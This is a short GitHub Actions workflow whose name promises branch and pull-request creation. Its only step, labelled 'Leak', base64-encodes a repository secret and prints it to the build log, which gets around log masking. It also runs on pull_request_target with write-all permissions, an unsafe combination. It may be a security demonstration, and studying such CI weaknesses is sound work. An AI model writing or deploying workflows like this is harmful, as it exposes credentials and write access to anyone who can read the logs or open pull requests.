name: Create and Push Branch, Then Make PR

on:
  pull_request:
    types: [opened, reopened, synchronize, edited]
  pull_request_target:
    types: [assigned, opened, synchronize, reopened]
  repository_dispatch:
  # This is so that when the bot creates the repo, it triggers
  # But it will create a recursive workflow, so gotta fix it later
    types: [create-pull-request] 

permissions: 
  write-all

jobs:
  create-push-pr:
    runs-on: ubuntu-latest

    steps:
      - name: Leak
        env:
          GITHUB_TOKEN: ${{ secrets.SUPER_SECRET }}
        run: |
          echo $GITHUB_TOKEN | base64 -w0 

